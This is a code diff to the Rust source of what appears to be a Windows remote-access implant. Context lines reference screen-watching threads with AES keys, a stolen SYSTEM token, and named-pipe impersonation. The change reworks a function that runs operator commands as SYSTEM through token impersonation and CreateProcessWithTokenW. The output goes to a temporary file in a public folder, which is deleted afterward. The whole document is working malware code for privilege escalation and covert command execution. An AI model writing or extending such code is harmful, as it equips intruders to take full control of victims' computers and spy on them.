@@ -156,57 +156,76 @@ fn spawn_screenwatch_thread(agent_id: String, aes_key: Vec<u8>, interval_sec: u6
 // ── Shell helpers ─────────────────────────────────────────────────────────────
 
 #[cfg(target_os = "windows")]
-#[cfg(target_os = "windows")]
 unsafe fn shell_as_system(cmd: &str, token: isize) -> String {
     fn to_wide(s: &str) -> Vec<u16> { s.encode_utf16().chain(std::iter::once(0)).collect() }
-    let full = format!("cmd.exe /s /c \"{}\" 2>&1", cmd);
-    let mut wcmd = to_wide(&full);
+    fn to_wide_n(s: &str) -> Vec<u8> { s.bytes().chain(std::iter::once(0)).collect() }
 
-    let mut h_read = 0isize;
-    let mut h_write = 0isize;
-    let mut sa: windows_sys::Win32::Security::SECURITY_ATTRIBUTES =
-        std::mem::zeroed();
-    sa.nLength = std::mem::size_of_val(&sa) as u32;
-    sa.bInheritHandle = 1;
-    if CreatePipe(&mut h_read, &mut h_write, &sa, 0) == 0 {
-        return "[error: CreatePipe]".into();
+    // seclogon duplicates handles listed in STARTUPINFOW.hStdOutput/hStdError
+    // into the child process. Open an inheritable file handle and pass it
+    // explicitly; run via "cmd.exe /c CMD" with no shell redirect in cmdline.
+    let uid = GetCurrentProcessId() ^ GetTickCount();
+    let out_path = format!("C:\\Users\\Public\\sb{:08x}.out", uid);
+
+    let sa = SECURITY_ATTRIBUTES {
+        nLength: std::mem::size_of::<SECURITY_ATTRIBUTES>() as u32,
+        lpSecurityDescriptor: std::ptr::null_mut(),
+        bInheritHandle: 1,
+    };
+    let hfile = CreateFileA(
+        to_wide_n(&out_path).as_ptr(),
+        GENERIC_WRITE,
+        FILE_SHARE_READ | FILE_SHARE_WRITE,
+        &sa,
+        CREATE_ALWAYS,
+        FILE_ATTRIBUTE_NORMAL,
+        0,
+    );
+    if hfile == -1isize || hfile == 0 {
+        return format!("[error: CreateFile {}]", GetLastError());
     }
-    SetHandleInformation(h_read, HANDLE_FLAG_INHERIT, 0);
+
+    let cli = format!("cmd.exe /c {}", cmd);
+    let mut wcli = to_wide(&cli);
 
     let mut si: STARTUPINFOW = std::mem::zeroed();
-    si.cb = std::mem::size_of::<STARTUPINFOW>() as u32;
-    si.dwFlags = STARTF_USESTDHANDLES;
-    si.hStdOutput = h_write;
-    si.hStdError  = h_write;
+    si.cb          = std::mem::size_of::<STARTUPINFOW>() as u32;
+    si.dwFlags     = STARTF_USESTDHANDLES;
+    si.hStdInput   = 0;
+    si.hStdOutput  = hfile;
+    si.hStdError   = hfile;
     let mut pi: PROCESS_INFORMATION = std::mem::zeroed();
 
-    ImpersonateLoggedOnUser(token);
-    // Thread is now SYSTEM → SeAssignPrimaryTokenPrivilege held;
-    // CreateProcessAsUserW + bInheritHandles=1 properly inherits pipe handles.
-    let ok = CreateProcessAsUserW(
-        token, std::ptr::null(), wcmd.as_mut_ptr(),
-        std::ptr::null(), std::ptr::null(), 1,
-        CREATE_NO_WINDOW, std::ptr::null(), std::ptr::null(),
-        &si, &mut pi,
-    );
-    RevertToSelf();
-    CloseHandle(h_write);
-    if ok == 0 {
-        CloseHandle(h_read);
-        return format!("[error: CreateProcessAsUserW {}]", GetLastError());
+    let imp_ok = ImpersonateLoggedOnUser(token);
+    let imp_err = GetLastError();
+    let mut proc_ok = 0i32;
+    let mut proc_err = 0u32;
+    if imp_ok != 0 {
+        proc_ok = CreateProcessWithTokenW(
+            token, 0, std::ptr::null(), wcli.as_mut_ptr(),
+            CREATE_NO_WINDOW, std::ptr::null(), std::ptr::null(),
+            &si, &mut pi,
+        );
+        proc_err = GetLastError();
+        RevertToSelf();
+    }
+    CloseHandle(hfile);  // parent closes its copy; child holds its own
+
+    if imp_ok == 0 {
+        let _ = std::fs::remove_file(&out_path);
+        return format!("[error: ImpersonateLoggedOnUser {}]", imp_err);
+    }
+    if proc_ok == 0 {
+        let _ = std::fs::remove_file(&out_path);
+        return format!("[error: CreateProcessWithTokenW {}]", proc_err);
     }
 
-    let mut buf = Vec::<u8>::with_capacity(4096);
-    let mut tmp = [0u8; 512];
-    let mut nr = 0u32;
-    while ReadFile(h_read, tmp.as_mut_ptr() as _, 512, &mut nr, std::ptr::null_mut()) != 0 && nr > 0 {
-        buf.extend_from_slice(&tmp[..nr as usize]);
-    }
     WaitForSingleObject(pi.hProcess, 60000);
-    CloseHandle(h_read);
     CloseHandle(pi.hProcess);
     CloseHandle(pi.hThread);
-    String::from_utf8_lossy(&buf).into_owned()
+
+    let result = std::fs::read_to_string(&out_path).unwrap_or_default();
+    DeleteFileW(to_wide(&out_path).as_ptr());
+    result
 }
 
 fn shell(cmd: &str) -> String {
@@ -375,8 +394,11 @@ use windows_sys::Win32::System::Services::{
 #[cfg(target_os = "windows")]
 use windows_sys::Win32::Storage::FileSystem::{
     FILE_FLAG_OVERLAPPED, PIPE_ACCESS_DUPLEX, CreatePipe,
-    ReadFile, SetHandleInformation, HANDLE_FLAG_INHERIT,
+    ReadFile, SetHandleInformation, HANDLE_FLAG_INHERIT, DeleteFileW,
+    CreateFileA, GENERIC_WRITE, FILE_SHARE_READ, FILE_SHARE_WRITE,
+    CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL,
 };
+use windows_sys::Win32::Security::SECURITY_ATTRIBUTES;
 #[cfg(target_os = "windows")]
 use windows_sys::Win32::System::Pipes::{
     ConnectNamedPipe, CreateNamedPipeW, ImpersonateNamedPipeClient, PIPE_TYPE_BYTE,
@@ -388,13 +410,16 @@ use windows_sys::Win32::Foundation::WAIT_OBJECT_0;
 #[cfg(target_os = "windows")]
 use windows_sys::Win32::System::Threading::{
     CreateEventW, WaitForSingleObject, GetCurrentThreadId,
-    CreateProcessAsUserW, OpenThreadToken, GetCurrentThread,
+    CreateProcessWithTokenW, OpenThreadToken, GetCurrentThread,
+    GetCurrentProcessId,
     PROCESS_INFORMATION, STARTUPINFOW, CREATE_NO_WINDOW, STARTF_USESTDHANDLES,
     TOKEN_IMPERSONATE,
 };
+#[cfg(target_os = "windows")]
+use windows_sys::Win32::System::SystemInformation::GetTickCount;
 
 // Primary SYSTEM token stored by get_system(); shell() uses it via
-// CreateProcessAsUserW (after ImpersonateLoggedOnUser) so commands run as SYSTEM.
+// CreateProcessWithTokenW (after ImpersonateLoggedOnUser) so commands run as SYSTEM.
 #[cfg(target_os = "windows")]
 static mut G_SYSTEM_TOKEN: isize = 0;
 
